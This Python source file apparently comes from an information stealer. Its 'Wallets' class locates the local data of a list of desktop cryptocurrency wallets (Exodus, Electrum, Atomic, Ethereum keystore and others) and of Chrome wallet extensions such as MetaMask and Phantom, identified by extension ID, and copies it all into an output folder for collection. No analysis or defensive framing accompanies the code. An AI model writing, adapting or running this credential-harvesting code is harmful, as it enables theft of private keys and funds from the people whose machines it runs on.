import os
import shutil
import logging


class Wallets:
    WALLET_PATHS = {
        'Exodus': os.path.join(os.getenv('APPDATA', ''), 'Exodus', 'exodus.wallet'),
        'Atomic': os.path.join(os.getenv('APPDATA', ''), 'atomic', 'Local Storage', 'leveldb'),
        'Electrum': os.path.join(os.getenv('APPDATA', ''), 'Electrum', 'wallets'),
        'Coinomi': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Coinomi', 'Coinomi', 'wallets'),
        'Guarda': os.path.join(os.getenv('APPDATA', ''), 'Guarda', 'Local Storage', 'leveldb'),
        'Zcash': os.path.join(os.getenv('APPDATA', ''), 'Zcash'),
        'Armory': os.path.join(os.getenv('APPDATA', ''), 'Armory'),
        'Bytecoin': os.path.join(os.getenv('APPDATA', ''), 'bytecoin'),
        'Jaxx': os.path.join(os.getenv('APPDATA', ''), 'com.liberty.jaxx', 'IndexedDB'),
        'Ethereum': os.path.join(os.getenv('APPDATA', ''), 'Ethereum', 'keystore'),
    }

    _log = logging.getLogger('Wallets')

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'Wallets')
        found_any = False

        for name, src_path in cls.WALLET_PATHS.items():
            if not os.path.exists(src_path):
                continue

            dst_path = os.path.join(out, name)
            os.makedirs(dst_path, exist_ok=True)
            found_any = True

            try:
                if os.path.isdir(src_path):
                    for root, dirs, files in os.walk(src_path):
                        rel = os.path.relpath(root, src_path)
                        dst_sub = os.path.join(dst_path, rel)
                        os.makedirs(dst_sub, exist_ok=True)
                        for fname in files:
                            src_file = os.path.join(root, fname)
                            dst_file = os.path.join(dst_sub, fname)
                            try:
                                file_size = os.path.getsize(src_file)
                                if file_size > 10 * 1024 * 1024:  # skip files > 10MB
                                    continue
                                shutil.copy2(src_file, dst_file)
                            except Exception as e:
                                cls._log.debug(f'Failed to copy {src_file}: {e}')
                elif os.path.isfile(src_path):
                    shutil.copy2(src_path, os.path.join(dst_path, os.path.basename(src_path)))
            except Exception as e:
                cls._log.debug(f'Failed to copy wallet {name}: {e}')

        # Browser extension wallets — check for MetaMask, Phantom, etc.
        browser_wallets = {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'TronLink': 'ibnejdfjmmkpcnlpebklmnkoeoihofec',
            'Ronin': 'fnjhmkhhmkbjkkabndcnnogagogbneec',
            'Binance': 'fhbohimaelbohpjbbldcngcnapndodjp',
        }
        chrome_ext_base = os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome',
                                        'User Data', 'Default', 'Local Extension Settings')

        if os.path.isdir(chrome_ext_base):
            for wallet_name, ext_id in browser_wallets.items():
                ext_path = os.path.join(chrome_ext_base, ext_id)
                if os.path.isdir(ext_path):
                    dst_ext = os.path.join(out, f'Extension_{wallet_name}')
                    try:
                        shutil.copytree(ext_path, dst_ext, dirs_exist_ok=True)
                        found_any = True
                        cls._log.info(f'Copied {wallet_name} extension data')
                    except Exception as e:
                        cls._log.debug(f'Failed to copy extension {wallet_name}: {e}')

        if found_any:
            cls._log.info(f'Wallet data saved to {out}')
        else:
            cls._log.info('No wallets found')
